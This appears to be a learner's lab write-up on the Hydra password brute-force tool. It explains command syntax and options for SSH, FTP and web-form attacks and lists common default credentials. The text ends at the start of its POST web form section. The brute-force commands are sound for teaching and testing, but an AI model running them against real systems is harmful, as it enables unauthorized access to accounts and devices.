<h1 align="center"> Hydra </h1>

<img width="1349" height="186" alt="image" src="https://github.com/user-attachments/assets/62d7c515-055d-4149-b62a-d14f0d9a703f" />



---


## Task 1

What is Hydra?

Hydra is a password brute-force tool.

A brute-force attack means:
- we already know a username
- We try many passwords automatically
- Hydra tests them very fast until one works

Instead of typing passwords manually:
````
admin : 123456
admin : password
admin : qwerty
admin : letmein
````
Hydra automates it:
````
hydra -l admin -P passwords.txt ssh://192.168.1.10
````
Meaning:
- ``-l admin`` → username = admin
- ``-P passwords.txt`` → use a password list file
- ``ssh://192.168.1.10`` → attack SSH service

Hydra will try:

admin : 123456
admin : password
admin : qwerty
...

until it finds:
````
[22][ssh] host:192.168.1.10 login:admin password:secret123
````
What services can Hydra test?
- SSH
- FTP
- HTTP login forms
- Telnet
- SMB
- RDP
- POP3
- IMAP
- MySQL
- VNC

Example:

- FTP attack
````
hydra -l admin -P rockyou.txt ftp://10.10.10.5
````
Web login form
````
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
````


Why does the screenshot mention admin:password?

Because many devices use weak default credentials:
````
admin:admin
admin:password
root:root
````
Examples:
- CCTV cameras
- Routers
- IoT devices

Attackers often try these first.

That’s why the page says:

> Strong passwords matter.

- Bad:
````
password123
admin123
qwerty
````

- Better:
````
R3d!Tiger#2026
````


---


## Using Hydra

### General Hydra structure
````
hydra [options] target service
````
Example:
````
hydra -l user -P passlist.txt ftp://10.49.146.169
````
Meaning:
- ``hydra`` → run Hydra
- ``-l user`` → single username
- ``-P passlist.txt`` → password list file
- ``ftp://`` → service to attack
- ``10.49.146.169`` → target IP

Hydra will try every password in the file for that user.


### SSH 
````
hydra -l root -P passwords.txt 10.49.146.169 -t 4 ssh
````
| Option | Meaning                     |
| ------ | --------------------------- |
| `-l`   | username                    |
| `-P`   | password list               |
| `-t`   | threads (parallel attempts) |


Explanation:
- ``root`` → login username
- ``passwords.txt`` → password file
- ``-t 4`` → try 4 passwords simultaneously
- ``ssh`` → target service


Hydra attacks:
````
root : password1
root : admin123
root : qwerty
...
````


#### Threads (-t)
````
-t 4
````
Means:

Hydra runs **4 attempts at once**.

Without threads:
````
Try one
Wait
Try next
Wait
````
With threads: ``Try 4 passwords simultaneously``

Faster brute forcing.


### POST Web Form section

This is for website login pages.
````
Username: admin
Password: test
````







